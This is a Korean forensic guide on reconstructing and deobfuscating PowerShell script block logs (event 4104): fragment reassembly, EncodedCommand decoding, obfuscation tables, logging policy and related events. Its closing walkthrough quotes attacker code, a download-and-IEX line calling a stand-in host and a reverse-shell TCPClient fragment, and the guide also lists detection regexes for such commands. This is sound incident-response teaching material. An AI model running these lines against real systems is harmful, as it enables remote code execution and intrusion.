---
id: FOR-0097
title: "PowerShell 4104 ScriptBlock 로깅: 쪼개진 스크립트 재조립과 난독화 해제"
slug: "powershell-4104-scriptblock"
category: "Event Log"
type: "guide"
difficulty: "intermediate"
priority: "critical"
platform: [windows]
artifact: ["ScriptBlockText", "ScriptBlockId", "PowerShell Operational", "EncodedCommand", "Windows PowerShell.evtx"]
file_paths: ["C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx", "C:\\Windows\\System32\\winevt\\Logs\\Windows PowerShell.evtx"]
registry_paths: ["HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription"]
event_ids: ["4104", "4105", "4106", "400", "403", "500", "600", "800"]
protocols: []
tools: ["EvtxECmd", "Event Viewer", "PowerShell", "CyberChef", "Timeline Explorer"]
commands: ["Get-WinEvent -Path ps.evtx -FilterXPath '*[System[EventID=4104]]'", "[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))", "wevtutil qe Microsoft-Windows-PowerShell/Operational /q:\"*[System[(EventID=4104)]]\" /f:text"]
regex_patterns: ["-[eE]{1,3}[a-zA-Z]*\\s+([A-Za-z0-9+/=]{40,})", "(?i)(IEX|Invoke-Expression|DownloadString|FromBase64String|-nop|-w\\s+hidden)"]
wireshark_filters: []
tshark_fields: []
log_fields: ["ScriptBlockText", "ScriptBlockId", "Path", "MessageNumber", "MessageTotal", "Level"]
file_formats: ["evtx"]
primary_terms: ["4104", "ScriptBlock 로깅", "파워쉘 스크립트 로그", "powershell 4104"]
keywords: ["4104", "ScriptBlockText", "ScriptBlockId", "script block logging", "PowerShell", "MessageNumber", "MessageTotal", "EncodedCommand", "난독화", "base64", "UTF-16LE", "4105", "4106", "Windows PowerShell.evtx", "evtx"]
aliases: ["4104", "powershell 4104", "파워쉘 스크립트 로그", "스크립트블록 로깅", "powershell 명령 복원", "encodedcommand 디코딩", "파워쉘 난독화 해제", "powershell 로그 어디"]
symptom_keywords: ["4104 스크립트가 잘려 있다", "PowerShell 명령을 복원해야 한다", "-enc 뒤 base64를 못 읽는다", "스크립트가 여러 이벤트로 나뉘어 있다", "PowerShell 로깅이 꺼져 있다", "난독화된 명령을 풀어야 한다"]
related: ["FOR-0098", "FOR-0121", "FOR-0088"]
source_ids: ["SRC-023", "SRC-016", "SRC-074"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

4104는 실행된 PowerShell **코드 본문 자체**를 `ScriptBlockText`에 남긴다. 긴 스크립트는 `MessageNumber`/`MessageTotal`로 여러 레코드에 쪼개지므로 **`ScriptBlockId`로 묶고 `MessageNumber` 순으로 이어 붙여야** 원본이 복원된다.

## 어떤 문제에서 필요한가

- "공격자가 실행한 PowerShell 명령의 전문을 복원하라"
- "`powershell.exe -enc SQBFAFgA...`의 내용을 해독하라"
- 4688/Sysmon 1의 `CommandLine`이 `-EncodedCommand`로만 남아 있을 때
- "다운로드한 URL은 무엇인가" — `DownloadString`, `Invoke-WebRequest` 인자
- 로깅이 꺼진 환경에서도 남는 **Warning 레벨 4104**로 최소한의 증거 확보
- 스크립트 파일이 삭제됐지만 로그에 본문이 남아 있는 경우

넘어온 **인자 값**과 호스트 정보가 필요하면 4103(모듈 로깅) 전담 글(FOR-0098)을 본다. 4104는 코드, 4103은 실행된 커맨드릿과 파라미터다.

## 문제에서 처음 볼 단서

1. 첨부에 `Microsoft-Windows-PowerShell%4Operational.evtx`가 있다 → 4104를 가장 먼저 센다
2. 4688/Sysmon 1의 명령행에 `-enc`, `-e`, `-EncodedCommand` → 그 base64를 디코딩
3. `-nop`, `-w hidden`, `-noni`, `-ExecutionPolicy Bypass` → 공격 스크립트 확정
4. 4104의 `Path`에 파일 경로가 있다 → 그 파일을 `$MFT`에서 찾는다
5. `MessageTotal`이 1보다 크다 → 재조립이 필요하다

## 30초 절차

```powershell
# 원본: Microsoft-Windows-PowerShell%4Operational.evtx -> ps.evtx
Get-WinEvent -Path 'C:\case\ps.evtx' -FilterXPath '*[System[EventID=4104]]' | Format-List
```

건수가 많으면 Warning(Level 3)만 먼저 본다. 자동 탐지에 걸린 것들이므로 적중률이 가장 높다.

```powershell
Get-WinEvent -FilterHashtable @{Path='C:\case\ps.evtx'; Id=4104; Level=3} |
  Select-Object -First 20 TimeCreated, Message
```

## 상세 절차

### 1단계 — 필드 구조

| 필드 | 의미 | 읽는 법 |
| --- | --- | --- |
| `ScriptBlockText` | **실행된 코드 본문(조각)** | 여기가 답이 들어 있는 곳 |
| `ScriptBlockId` | 스크립트 블록 GUID | **조각을 묶는 키** |
| `Path` | 스크립트 파일 경로 | 콘솔 직접 입력이면 빈 값 |
| `MessageNumber` | 이 조각의 순번 (1부터) | 정렬 키 |
| `MessageTotal` | 전체 조각 수 | 1이면 재조립 불필요 |

`System/Level` 값도 함께 본다.

| Level | 표시 | 언제 남는가 |
| --- | --- | --- |
| 3 | Warning | **의심 패턴 자동 탐지.** 정책이 꺼져 있어도 남는 경우가 있다 |
| 5 | Verbose | `EnableScriptBlockLogging=1`일 때 **모든** 스크립트 블록 |

즉 4104가 몇 건뿐이고 전부 Warning이면 **로깅이 꺼진 환경**이라는 뜻이고, 수천 건이 Verbose로 있으면 전면 로깅 환경이다. 이 판단을 먼저 해야 "왜 명령이 안 보이는지"를 설명할 수 있다.

### 2단계 — ScriptBlockId로 재조립 (이 글의 핵심)

한 레코드의 `ScriptBlockText`는 길이 제한 때문에 잘린다. 그대로 읽으면 스크립트 중간이 사라진 것처럼 보인다.

```powershell
$ps = 'C:\case\ps.evtx'

$blocks = Get-WinEvent -Path $ps -FilterXPath '*[System[EventID=4104]]' |
  ForEach-Object {
    $x = [xml]$_.ToXml()
    $d = @{}
    $x.Event.EventData.Data | ForEach-Object { $d[$_.Name] = $_.'#text' }
    [pscustomobject]@{
      TimeUtc = $_.TimeCreated.ToUniversalTime()
      Level   = $x.Event.System.Level
      Id      = $d['ScriptBlockId']
      Num     = [int]$d['MessageNumber']
      Total   = [int]$d['MessageTotal']
      Path    = $d['Path']
      Text    = $d['ScriptBlockText']
    }
  } |
  Group-Object Id |
  ForEach-Object {
    $parts = $_.Group | Sort-Object Num
    $head  = $parts | Select-Object -First 1
    [pscustomobject]@{
      ScriptBlockId = $_.Name
      FirstTimeUtc  = $head.TimeUtc
      Have          = $parts.Count
      Total         = $head.Total
      Path          = $head.Path
      Script        = -join $parts.Text
    }
  } | Sort-Object FirstTimeUtc

$blocks | Format-Table ScriptBlockId, FirstTimeUtc, Have, Total, Path -AutoSize
```

출력:

```text
ScriptBlockId                        FirstTimeUtc        Have Total Path
-------------                        ------------        ---- ----- ----
7c0e1f3a-2b44-4a9e-9f10-51d2c4b8e001 2026-03-14 07:20:08    1     1
b41d55c8-9e77-4c31-8a02-77bb31cf0a12 2026-03-14 07:20:09   12    12
2f9a7714-0cd3-4d55-91c6-0a3b6e2f8d33 2026-03-14 07:24:41    7     9  C:\Users\svc_backup\AppData\Local\Temp\a.ps1
```

`Have`와 `Total`이 다른 블록(7/9)은 **조각이 유실**된 것이다. 로그 순환으로 앞부분이 밀려 나갔을 때 생긴다. 이때는 남은 조각만으로 부분 복원하고, 유실 사실을 답에 명시한다.

전문을 파일로 떨어뜨린다.

```powershell
$out = 'C:\case\out\scriptblocks'
New-Item -ItemType Directory -Force -Path $out | Out-Null
foreach ($b in $blocks) {
  $b.Script | Set-Content -Path (Join-Path $out ("{0}.ps1" -f $b.ScriptBlockId)) -Encoding UTF8
}
```

이제 `Select-String`으로 한 번에 훑는다([FOR-0121](./powershell-select-string.html)).

```powershell
Select-String -Path 'C:\case\out\scriptblocks\*.ps1' -Pattern 'http[s]?://|DownloadString|FromBase64String|IEX|-enc' -AllMatches
```

### 3단계 — -EncodedCommand 디코딩

`-EncodedCommand`의 인자는 **UTF-16LE(리틀엔디언 유니코드) 문자열을 Base64로 인코딩**한 것이다. UTF-8로 디코딩하면 글자 사이에 널 바이트가 끼어 깨진다.

```powershell
$b64 = 'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA'
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
```

```text
IEX(New-Object
```

리눅스에서는 이렇게 한다.

```bash
echo 'SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAA' | base64 -d | iconv -f UTF-16LE -t UTF-8
```

Base64 문자열의 첫 몇 글자로 **디코딩하기 전에** 내용을 짐작할 수 있다. UTF-16LE ASCII 텍스트는 두 번째 바이트가 `0x00`이라 규칙적인 패턴이 나온다.

| Base64 접두 | 원문 시작 | 흔한 형태 |
| --- | --- | --- |
| `JAB` | `$` | `$env:`, `$client=` 로 시작하는 스크립트 |
| `SQBFAFgA` | `IEX` | `IEX(...)` 즉시 실행 |
| `cAB3AGQA` 계열 | `pwd`/`pow` | 소문자 시작 명령 |
| `SUVY` | `IEX` (UTF-8) | **UTF-16LE가 아니다.** 다른 경로로 들어온 base64 |
| `H4sI` | gzip 매직 `1f 8b` | 압축된 페이로드. 먼저 gunzip |

`SUVY`처럼 널 바이트 패턴이 없으면 그것은 `-EncodedCommand`가 아니라 스크립트 내부에서 쓰인 별도 base64다. UTF-8로 디코딩한다. Base64 알파벳과 패딩 규칙은 RFC 4648 그대로다.

압축 페이로드는 이렇게 푼다.

```powershell
$raw = [Convert]::FromBase64String($b64)
$ms  = New-Object IO.MemoryStream(, $raw)
$gz  = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
(New-Object IO.StreamReader($gz)).ReadToEnd()
```

`-EncodedCommand`는 부분 이름으로도 받아들여지므로 `-e`, `-en`, `-ec`, `-enc` 전부 같은 뜻이다. 검색 시 `-enc`만 찾으면 놓친다.

### 4단계 — 난독화 패턴 알아보기

| 기법 | 실제 모양 | 원문 |
| --- | --- | --- |
| 문자열 연결 | `('I'+'E'+'X')` | `IEX` |
| 역순 | `-join('XEI'[-1..-3])` | `IEX` |
| 포맷 연산자 | `"{1}{0}"-f 'EX','I'` | `IEX` |
| 백틱 삽입 | ``i`e`x`` | `iex` |
| 대소문자 뒤섞기 | `iEx`, `DoWnLoAdStRiNg` | 동일(PowerShell은 대소문자 구분 없음) |
| char 배열 | `[char[]](73,69,88) -join ''` | `IEX` |
| 환경변수 조각 | `$env:ComSpec[4,15,25]-join''` | `iex` |
| 별칭 | `&`, `.`, `sal`, `ni` | `Invoke-Expression` 등 |
| 압축 | `GzipStream` + `FromBase64String` | 임의 페이로드 |

**핵심은 이 모든 난독화가 4104에는 "난독화된 상태 그대로" 기록되지만, 최종 실행 단계의 스크립트 블록은 풀린 상태로 다시 4104에 남는 경우가 많다는 점이다.** `IEX`로 만들어진 새 스크립트 블록은 별개의 `ScriptBlockId`를 받아 다시 기록된다. 따라서 **시간순으로 정렬해 뒤쪽 블록을 보면 난독화가 스스로 풀려 있다.**

```powershell
$blocks | Where-Object { $_.Script -match 'http|Invoke-|New-Object|::' } |
  Select-Object FirstTimeUtc, ScriptBlockId, @{n='Head';e={$_.Script.Substring(0, [Math]::Min(120, $_.Script.Length))}} |
  Format-List
```

### 5단계 — 로깅 활성 여부 확인

레지스트리(SOFTWARE hive)에서 정책을 확인한다.

| 경로 | 값 이름 | 효과 |
| --- | --- | --- |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging` | `EnableScriptBlockLogging` = 1 | 4104 전면 기록(Verbose) |
| 같은 키 | `EnableScriptBlockInvocationLogging` = 1 | 4105/4106 추가 기록 |
| `HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription` | `EnableTranscripting` = 1 | 전사 텍스트 파일 생성 |
| 같은 키 | `OutputDirectory` | 전사 파일 저장 위치 |

값이 없거나 0이어도 **의심 패턴에 걸린 스크립트 블록은 Warning(Level 3) 4104로 남는 경우가 있다.** 그래서 "로깅이 꺼져 있었다"는 이유로 4104 조회를 건너뛰면 안 된다. 몇 건이라도 있으면 그게 가장 악성인 몇 건이다.

레지스트리 하이브 위치와 로딩은 [FOR-0051](./registry-hive-map.html)을 본다.

### 6단계 — 인접 Event ID 구분

| ID | 채널 | 내용 |
| --- | --- | --- |
| 4104 | `Microsoft-Windows-PowerShell/Operational` | **스크립트 블록 텍스트(코드 본문)** |
| 4103 | 같음 | 모듈 로깅. 실행된 커맨드릿과 파라미터 값(FOR-0098) |
| 4105 | 같음 | 스크립트 블록 실행 **시작** |
| 4106 | 같음 | 스크립트 블록 실행 **완료** |

4105/4106은 `ScriptBlockId`만 있고 본문이 없다. 4104에서 본문을, 4105/4106에서 **실제로 실행된 시각과 횟수**를 얻는다. 4104가 있어도 4105가 없다면 파싱은 됐지만 실행되지 않은 코드일 수 있다.

구형 엔진 로그는 별도 파일 `Windows PowerShell.evtx`에 있다.

| ID | 대표 내용 | 유용한 이유 |
| --- | --- | --- |
| 400 | 엔진 상태 None → Available (엔진 시작) | 세부 텍스트의 `HostApplication`에 **전체 명령행**이 있다 |
| 403 | 엔진 상태 Available → Stopped (엔진 종료) | 세션 종료 시각 |
| 600 | 공급자 수명주기(Registry, FileSystem 등 Started) | 실행 흔적. `HostApplication` 포함 |
| 800 | 파이프라인 실행 세부 정보 | `HostApplication` + 실행된 명령 문자열 |
| 500 | 명령 수명주기 | `LogPipelineExecutionDetails`가 켜져야 남는다. 없어도 정상 |

**`Microsoft-Windows-PowerShell/Operational`이 비어 있어도 `Windows PowerShell.evtx`의 400/600/800은 살아 있는 경우가 많다.** 이 파일은 PowerShell 2.0 시절부터 기본으로 켜져 있기 때문이다. 4104가 없을 때 첫 번째 대안이 이것이다.

## 출력 필드 해석

시간대는 EVTX `SystemTime` 기준 **UTC**다. `TimeCreated`를 그대로 쓰면 조회하는 PC의 로컬 시각으로 표시되므로 위 스크립트처럼 `.ToUniversalTime()`을 붙인다. 답이 KST면 +9시간.

| 상황 | 해석 |
| --- | --- |
| `Path`가 빈 값 | 콘솔에 직접 입력했거나 `-Command`/`-EncodedCommand`로 전달 |
| `Path`에 `.ps1` 경로 | 그 파일이 실행됐다. 파일 자체를 `$MFT`·카빙으로 찾는다 |
| `MessageTotal` = 1 | 한 레코드에 전문이 들어 있다 |
| `MessageTotal` > 1 | 재조립 필요 |
| 같은 `ScriptBlockText`가 반복 | 반복 실행. `ScriptBlockId`는 코드 내용 기준이라 같은 코드는 같은 ID를 받는다 |
| Level 3만 존재 | 로깅 비활성 환경. 남은 것만으로 판단 |

## pivot: 다음에 볼 artifact

| 여기서 얻은 값 | 다음에 볼 것 | 확인할 내용 |
| --- | --- | --- |
| 복원한 스크립트의 URL | pcap `http.request` / DNS | 실제 다운로드 발생 여부 |
| 복원한 스크립트의 파일 경로 | `$MFT` ([FOR-0021](./mft-basics.html)) | 그 파일의 생성·삭제 시각 |
| `Path`의 `.ps1` | 카빙·`$UsnJrnl` ([FOR-0027](./usnjrnl-basics.html)) | 삭제된 스크립트 파일 복구 |
| 4104 시각 | 4688 / Sysmon 1 | 부모 프로세스와 전체 명령행 |
| 4104 시각 | 4103 (FOR-0098) | 실제로 넘어간 파라미터 값 |
| `ScriptBlockId` | 4105 / 4106 | 실행 시각과 실행 횟수 |
| 실행 계정 | 4624의 `TargetLogonId` ([FOR-0083](./event-4624-logon.html)) | 어느 로그온 세션에서 실행됐는가 |
| 스크립트의 지속성 코드 | Run 키 · 서비스 · 예약 작업 | 실제로 등록됐는지 |

## 흔한 함정

- **한 레코드의 `ScriptBlockText`를 전문으로 착각하는 것.** 긴 스크립트는 조각으로 잘린다 → 답의 핵심(URL, 키)이 2번째 조각에 있으면 못 찾는다 → `ScriptBlockId`로 묶고 `MessageNumber` 순으로 이어 붙인다.
- **조각을 시간순으로 이어 붙이는 것.** 같은 밀리초에 여러 조각이 기록되면 순서가 뒤섞인다 → 반드시 `MessageNumber`로 정렬한다.
- **`-EncodedCommand`를 UTF-8로 디코딩하는 것.** 글자 사이에 널 바이트가 남아 `I.E.X.` 처럼 보인다 → UTF-16LE(`[Text.Encoding]::Unicode`)로 디코딩한다.
- **`-enc`만 검색하는 것.** `-e`, `-en`, `-ec`도 같은 파라미터다 → `-e`로 시작하는 짧은 스위치 + 40자 이상 base64 패턴으로 찾는다.
- **로깅이 꺼져 있다고 4104를 건너뛰는 것.** 의심 패턴은 Warning(Level 3)으로 남는 경우가 있다 → 건수가 적어도 반드시 확인한다.
- **난독화된 첫 블록만 보고 포기하는 것.** `IEX`가 만든 새 블록이 풀린 상태로 뒤에 기록된다 → 시간순 뒤쪽 블록을 먼저 읽는다.
- **4104와 4103을 같은 것으로 보는 것.** 4104는 코드 본문, 4103은 실행된 커맨드릿과 파라미터 값이다 → 인자에 들어간 실제 값이 필요하면 4103을 본다.
- **`Have`와 `Total`이 다른데 그대로 답하는 것.** 조각 유실 상태의 부분 복원이다 → 유실을 명시하고 다른 근거(전사 파일, 4688 명령행)를 찾는다.
- **`Windows PowerShell.evtx`를 무시하는 것.** Operational 채널이 비어 있어도 400/600/800은 남아 있곤 한다 → 4104가 없으면 즉시 이 파일로 넘어간다.
- **Event Viewer의 로컬 시각으로 답하는 것.** 내부 저장은 UTC다 → KST 요구 시 +9시간.

## 교차검증

```powershell
$ps  = 'C:\case\ps.evtx'
$psc = 'C:\case\WindowsPowerShell.evtx'   # 원본: Windows PowerShell.evtx
$sec = 'C:\case\Security.evtx'

# 1) 4104 총 건수와 Level 분포 (로깅 상태 판정)
Get-WinEvent -Path $ps -FilterXPath '*[System[EventID=4104]]' |
  Group-Object { ([xml]$_.ToXml()).Event.System.Level } | Format-Table Count, Name

# 2) 4105/4106 — 실제 실행 여부
Get-WinEvent -Path $ps -FilterXPath '*[System[EventID=4105 or EventID=4106]]' |
  Select-Object -First 10 TimeCreated, Id

# 3) 구형 엔진 로그의 전체 명령행
Get-WinEvent -Path $psc -FilterXPath '*[System[EventID=400 or EventID=800]]' |
  Where-Object { $_.Message -match 'HostApplication' } |
  Select-Object -First 10 TimeCreated, Message

# 4) 4688 — powershell.exe 실행 시점과 부모
Get-WinEvent -FilterHashtable @{Path=$sec; Id=4688} |
  Where-Object { $_.Message -match 'powershell' }

# 5) 전사 파일이 있는지
Get-ChildItem 'C:\case\mount\Users\*\Documents\PowerShell_transcript*' -Recurse -ErrorAction SilentlyContinue
```

4104의 스크립트 본문, 4688의 명령행, 전사 파일 세 개가 같은 내용을 가리키면 확정이다. 하나만 있으면 "이 근거로는 여기까지"를 답에 명시한다.

## mini walkthrough

```text
문제:
"공격자가 다운로드한 페이로드의 URL 전체를 답하시오.
 첨부: Microsoft-Windows-PowerShell%4Operational.evtx, Security.evtx"

1. 첫 시도 (실패):
   Event Viewer 로 4104 를 열어 가장 수상한 항목을 읽었다.

     ScriptBlockText:
       $wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');
       $wc.DownloadFile('http://cdn-update

   -> 문자열이 여기서 끊겨 있다. "http://cdn-update" 로 답했다. 오답.

   왜 틀렸나:
   MessageNumber=1, MessageTotal=4 였다. 한 레코드에는 조각만 들어 있다.
   Event Viewer 는 조각을 이어 주지 않는다.

2. 피벗 — ScriptBlockId 로 묶어 재조립했다.
   $blocks = ... Group-Object Id ... -join ($parts | Sort-Object Num).Text

   ScriptBlockId                        Have Total
   b41d55c8-9e77-4c31-8a02-77bb31cf0a12    4     4

   재조립 결과:
     $wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');
     $wc.DownloadFile('http://cdn-update.example.net:8080/pkg/a7f2.dat',
                      "$env:TEMP\a.dat");
     IEX (Get-Content "$env:TEMP\a.dat" -Raw)

3. 4688 명령행 확인:
   07:20:08  powershell.exe -nop -w hidden -enc JABsAGMAPQBOAGUAdwAtAE8A...

   base64 가 JAB 로 시작 -> UTF-16LE 이고 원문이 '$' 로 시작한다.
   [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
   -> 2단계에서 재조립한 것과 동일한 스크립트.

4. 두 번째 블록도 확인 (IEX 가 만든 새 블록):
   07:20:11  ScriptBlockId 2f9a7714-...  Total 1
     $s=New-Object Net.Sockets.TCPClient('45.146.164.9',4444) ...
   -> 다운로드한 페이로드가 리버스 셸이었다. 별개 ScriptBlockId 로 풀려서 기록됐다.

5. pcap 대조:
   http.request.uri contains "/pkg/a7f2.dat"  -> 07:20:09 에 200 응답 확인

6. 시간대: 07:20:08 UTC = 16:20:08 KST (+9h)

정답: http://cdn-update.example.net:8080/pkg/a7f2.dat
```

1단계의 오답이 이 주제에서 가장 흔한 실패다. **Event Viewer 화면 하나가 스크립트 하나가 아니다.** `MessageTotal`을 보는 습관 하나로 갈린다.

## 막혔을 때 다음 체크

1. `MessageTotal`을 확인했는가 → 1보다 크면 반드시 재조립
2. `Have` = `Total`인가 → 다르면 조각 유실. 부분 복원임을 명시
3. Level 분포를 봤는가 → Warning만 있으면 로깅 비활성 환경
4. base64를 UTF-16LE로 디코딩했는가 → 널 바이트가 보이면 인코딩 선택이 틀렸다
5. 시간순 뒤쪽 블록을 봤는가 → 난독화가 풀린 버전이 뒤에 있다
6. 4104가 아예 없는가 → `Windows PowerShell.evtx`의 400/600/800, 전사 파일, 4688 명령행
7. 인자 값이 필요한가 → 4103(모듈 로깅)의 `Payload`
8. 스크립트 파일 경로가 있는가 → `$MFT`·`$UsnJrnl`로 파일 자체를 복구
9. 네트워크 행위가 필요한가 → 복원한 URL/IP로 pcap과 Sysmon 3을 대조

## 출처

- SRC-023 — Microsoft Learn, about_Logging_Windows: 스크립트 블록 로깅(4104)·모듈 로깅(4103) 활성 정책과 `ScriptBlockLogging` 레지스트리 키 이름
- SRC-016 — MITRE ATT&CK T1059.001 PowerShell: `-EncodedCommand`, `-w hidden`, `IEX` 등 실제 공격에서 관측되는 실행 형태
- SRC-074 — RFC 4648: Base64 알파벳과 패딩 규칙(디코딩 판정 근거)
- `ScriptBlockText`의 조각 분할 길이(레코드당 최대 문자 수)는 버전에 따라 다르므로 특정 상수를 쓰지 않았다. `MessageTotal` 값을 근거로 판단할 것
- `Windows PowerShell.evtx`의 400/403/500/600/800은 렌더링 메시지 형식이 PowerShell 버전에 따라 다르다. 500은 `LogPipelineExecutionDetails` 설정에 의존하므로 없을 수 있다. 실제 로그의 Message 원문으로 확인할 것
